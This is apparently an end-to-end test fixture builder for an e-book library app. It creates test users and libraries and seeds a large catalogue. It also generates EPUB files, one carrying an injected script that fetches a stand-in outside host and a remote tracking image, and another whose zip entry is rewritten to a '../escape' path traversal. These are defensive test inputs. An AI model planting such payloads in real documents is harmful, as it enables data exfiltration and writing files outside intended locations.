import { readFile, writeFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { sql } from 'drizzle-orm';
import { Permission } from '@bookorbit/types';
import * as schema from '../../../src/db/schema';
import {
  createLibraryWithFolder,
  createUserAndLogin,
  grantLibraryAccess,
  locateBookByAbsolutePath,
  triggerAndWaitForLibraryScan,
  type ReaderStateIsolationE2EContext,
} from '../reader-state-isolation/reader-state-isolation-harness';
import { createZipArchiveFixture } from '../reader-state-isolation/reader-state-isolation-fixture-builder';

export async function prepareNativeQA(ctx: ReaderStateIsolationE2EContext, large = false) {
  const owner = await createUserAndLogin(ctx, {
    username: 'reader-a@example.test',
    email: 'reader-a@example.test',
    password: 'ReaderA-QA-24!',
    permissions: [Permission.LibraryDownload],
  });
  const other = await createUserAndLogin(ctx, {
    username: 'reader-b@example.test',
    email: 'reader-b@example.test',
    password: 'ReaderB-QA-24!',
    permissions: [Permission.LibraryDownload],
  });
  const denied = await createUserAndLogin(ctx);
  const library = await createLibraryWithFolder(ctx, { name: 'Native QA A' });
  const secret = await createLibraryWithFolder(ctx, { name: 'Native QA B' });
  await grantLibraryAccess(ctx, owner.userId, library.libraryId, 'owner');
  await grantLibraryAccess(ctx, other.userId, secret.libraryId, 'owner');
  const font = await readFile(fileURLToPath(new URL('../../../../native/QAFixtures/ABeeZee-Regular.ttf', import.meta.url)));
  const image = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR4nGP4DwQACfsD/fteaysAAAAASUVORK5CYII=', 'base64');
  const files: Record<string, Awaited<ReturnType<typeof locateBookByAbsolutePath>>> = {};
  for (const title of ['QA Prose', 'QA Broken', 'QA Hostile', 'QA Traversal', 'QA Fixed', 'B Secret']) {
    const target = title === 'B Secret' ? secret : library;
    const fixed = title === 'QA Fixed' ? '<meta property="rendition:layout">pre-paginated</meta>' : '';
    const hostile =
      title === 'QA Hostile'
        ? '<script>document.body.textContent="ATTACK";fetch("https://unsolicited.invalid/secret");window.webkit.messageHandlers.reader.postMessage({kind:"ready"})</script><img src="https://unsolicited.invalid/pixel" alt="Blocked remote image"/>'
        : '';
    const entries = [
      { path: 'mimetype', content: 'application/epub+zip', store: true },
      {
        path: 'META-INF/container.xml',
        content:
          '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
      },
      {
        path: 'book.opf',
        content: `<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">qa-${title}</dc:identifier><dc:title>${title}</dc:title><dc:language>en</dc:language>${fixed}</metadata><manifest><item id="one" href="one.xhtml" media-type="application/xhtml+xml"/><item id="two" href="two.xhtml" media-type="application/xhtml+xml"/><item id="image" href="image.png" media-type="image/png"/><item id="font" href="font.ttf" media-type="font/ttf"/></manifest><spine><itemref idref="one"/><itemref idref="two"/></spine></package>`,
      },
      {
        path: 'one.xhtml',
        content: `<html xmlns="http://www.w3.org/1999/xhtml"><head><title>One</title><meta name="viewport" content="width=800,height=1000"/><style>@font-face{font-family:QA;src:url('font.ttf')}p{font-family:QA}</style></head><body><h1>Chapter One</h1><p>The moon keeps its own time.</p><img src="image.png" alt="Moon"/>${hostile}</body></html>`,
      },
      {
        path: 'two.xhtml',
        content:
          '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Two</title><meta name="viewport" content="width=800,height=1000"/></head><body><h1>Chapter Two</h1></body></html>',
      },
      { path: 'font.ttf', content: font },
      ...(title === 'QA Broken' ? [] : [{ path: 'image.png', content: image }]),
      ...(title === 'QA Traversal' ? [{ path: 'xx/escape', content: 'refuse' }] : []),
    ];
    const path = await createZipArchiveFixture(target.folderPath, `${title}.epub`, entries);
    if (title === 'QA Traversal') {
      const bytes = await readFile(path);
      const marker = Buffer.from('xx/escape');
      for (let offset = bytes.indexOf(marker); offset >= 0; offset = bytes.indexOf(marker, offset + marker.length))
        Buffer.from('../escape').copy(bytes, offset);
      await writeFile(path, bytes);
    }
    await triggerAndWaitForLibraryScan(ctx, target.libraryId);
    const file = await locateBookByAbsolutePath(ctx, path);
    files[title] = file;
    await ctx.db
      .insert(schema.bookMetadata)
      .values({ bookId: file.bookId, title })
      .onConflictDoUpdate({ target: schema.bookMetadata.bookId, set: { title } });
  }
  if (large) {
    await ctx.db.execute(sql`
      WITH seeded AS (
        INSERT INTO books (library_id, library_folder_id, folder_path)
        SELECT ${library.libraryId}, ${library.libraryFolderId}, 'qa-catalog-' || n FROM generate_series(1, 49995) n RETURNING id
      )
      INSERT INTO book_metadata (book_id, title) SELECT id, 'Catalog ' || lpad(id::text, 8, '0') FROM seeded
    `);
    await ctx.db.execute(
      sql`INSERT INTO annotations (user_id, book_id, text) SELECT ${owner.userId}, ${files['QA Prose'].bookId}, 'Generated QA annotation ' || n FROM generate_series(1, 100000) n`,
    );
    await ctx.db.execute(sql`ANALYZE books`);
    await ctx.db.execute(sql`ANALYZE book_metadata`);
    await ctx.db.execute(sql`ANALYZE annotations`);
  }
  return { owner, other, denied, library, secret, files };
}
